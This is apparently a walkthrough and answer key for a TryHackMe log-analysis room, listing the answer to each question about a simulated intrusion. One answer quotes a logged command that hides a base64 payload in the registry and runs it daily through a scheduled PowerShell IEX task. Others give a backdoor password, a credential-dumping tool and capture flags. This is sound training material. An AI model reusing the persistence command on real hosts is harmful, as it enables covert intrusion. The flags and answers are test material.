# [Monday Monitor](https://tryhackme.com/room/mondaymonitor)

## Walkthrough

## Task 1

**Initial access was established using a downloaded file. What is the file name saved on the host?**
```shell
SwiftSpend_Financial_Expenses.xlsm
```
**What is the full command run to create a scheduled task?**
```shell
Scheduler | data.win.eventdata.parentCommandLine

\"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &amp; schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"
```
**What time is the scheduled task meant to run?**
```shell
12:34
```
**What was encoded?**
```shell
cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=

ping www.youarevulnerable.thm
```
**What password was set for the new user account?**
```shell
I_AM_M0NIT0R1NG
```
**What is the name of the .exe that was used to dump credentials?**
```shell
"mimikatz"

memotech.exe
```
**Data was exfiltrated from the host. What was the flag that was part of the data?**
```shell
THM{M0N1T0R_1$_1N_3FF3CT}
```
